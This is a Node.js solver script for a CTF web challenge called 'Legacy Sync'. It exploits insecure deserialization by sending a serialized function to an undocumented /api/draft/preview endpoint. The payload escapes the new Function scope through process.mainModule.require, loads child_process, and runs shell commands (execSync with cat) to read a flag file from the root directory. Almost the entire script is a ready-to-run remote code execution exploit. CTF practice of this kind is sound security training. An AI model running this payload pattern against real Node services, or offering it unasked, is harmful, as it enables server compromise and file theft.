/**
 * Solver — Legacy Sync (CTF Web Medium)
 * Vulnerability: Insecure deserialization via replicator + custom [[Function]] transform
 *
 * Prereq: npm install replicator    (copy utils/serializer.js from the zip next to this file)
 * Usage : TARGET=http://<host>:<port> node solver.js
 *
 * ─── KEY INSIGHT ──────────────────────────────────────────────────────────────
 * new Function() runs in the GLOBAL scope — `require` is undefined there.
 * Use process.mainModule.require() instead (process is always a global).
 * ──────────────────────────────────────────────────────────────────────────────
 */

'use strict';

const http = require('http');

const TARGET = process.env.TARGET || 'http://localhost:6767';

// Option A: generate payload via serializer (needs replicator + serializer.js)
let payload;

try {
  const serializer = require('./serializer');   // copy from challenge/src/utils/serializer.js

  payload = serializer.encode({
    title:   'test',
    content: 'test',
    formatter: function (s) {
      var cp = process.mainModule.require('child_process');
      var fs = process.mainModule.require('fs');
      var f  = fs.readdirSync('/').find(function (x) { return /^flag_/.test(x); });
      return f ? cp.execSync('cat /' + f).toString().trim() : 'flag not found, ls /: ' + fs.readdirSync('/').join(', ');
    },
  });

  console.log('[*] Payload generated via serializer.encode()');

} catch (_) {

  // Option B: hand-craft the JSON (no deps, read serializer.js for the format)
  console.log('[*] serializer.js not found — using hand-crafted JSON payload');
  console.log('[!] Make sure to read challenge/src/utils/serializer.js for the @t format\n');

  const body = [
    "var cp=process.mainModule.require('child_process');",
    "var fs=process.mainModule.require('fs');",
    "var f=fs.readdirSync('/').find(function(x){return /^flag_/.test(x);});",
    "return f?cp.execSync('cat /'+f).toString().trim():'not found: '+fs.readdirSync('/').join(',');",
  ].join('');

  payload = JSON.stringify([{
    title:   'test',
    content: 'test',
    formatter: { '@t': '[[Function]]', data: { args: ['s'], body } },
  }]);
}

// POST to undocumented /api/draft/preview
const requestBody = JSON.stringify({ data: payload });
const url         = new URL('/api/draft/preview', TARGET);

console.log('[*] Target:', url.href);

const req = http.request(
  {
    hostname: url.hostname,
    port:     url.port || (url.protocol === 'https:' ? 443 : 80),
    path:     url.pathname,
    method:   'POST',
    headers:  {
      'Content-Type':   'application/json',
      'Content-Length': Buffer.byteLength(requestBody),
    },
  },
  (res) => {
    let raw = '';
    res.on('data', chunk => { raw += chunk; });
    res.on('end', () => {
      try {
        const json = JSON.parse(raw);
        console.log('\n[+] Server response:', json);
        if (json.preview) console.log('\n[FLAG]', json.preview);
      } catch {
        console.log('[!] Raw response:', raw);
      }
    });
  },
);

req.on('error', e => console.error('[!] Request error:', e.message));
req.write(requestBody);
req.end();
